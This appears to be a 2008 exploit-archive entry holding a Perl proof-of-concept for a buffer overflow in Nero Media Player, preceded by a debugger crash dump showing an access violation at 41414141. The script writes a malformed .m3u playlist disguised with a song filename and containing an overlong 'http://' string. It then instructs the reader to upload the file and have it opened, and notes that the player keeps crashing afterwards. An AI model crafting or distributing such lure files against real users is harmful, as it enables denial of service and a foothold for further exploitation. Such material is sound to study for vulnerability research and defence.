# NERO Media Player <= 1.4.0.35b Remote Buffer Overflow( .M3U)
#
#
# This exception may be expected and handled.
# eax=03e90f40 ebx=41414141 ecx=009d01c8 edx=009d015c esi=03e90f38 edi=41414141
# eip=7c92b3fb esp=0010bff8 ebp=0010c214 iopl=0 nv up ei pl nz ac pe nc
# cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210212
# ntdll!wcsncat+0x387:
# 7c92b3fb 8b0b mov ecx,[ebx] ds:0023:41414141=????????
#EXCEPTION_RECORD: ffffffff -- (.exr ffffffffffffffff)
#ExceptionAddress: 7c92b3fb (ntdll!wcsncat+0x00000387)
# ExceptionCode: c0000005 (Access violation)
# ExceptionFlags: 00000000
#NumberParameters: 2
# Parameter[0]: 00000000
# Parameter[1]: 41414141
#Attempt to read from address 41414141

my $file="bob_marley_I_Shot_The_Sheriff.m3u";

open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE "http://"."A" x 700;
close($FILE);
print "$file has been created \n";
print "Upload it, and open it with Nero Media Player\n";
print "Credits:Securfrog";

#Btw , after the crash /*if not exploited ...*/ you wont be able to open Nero media player , it will constantly crash .

# milw0rm.com [2008-02-05]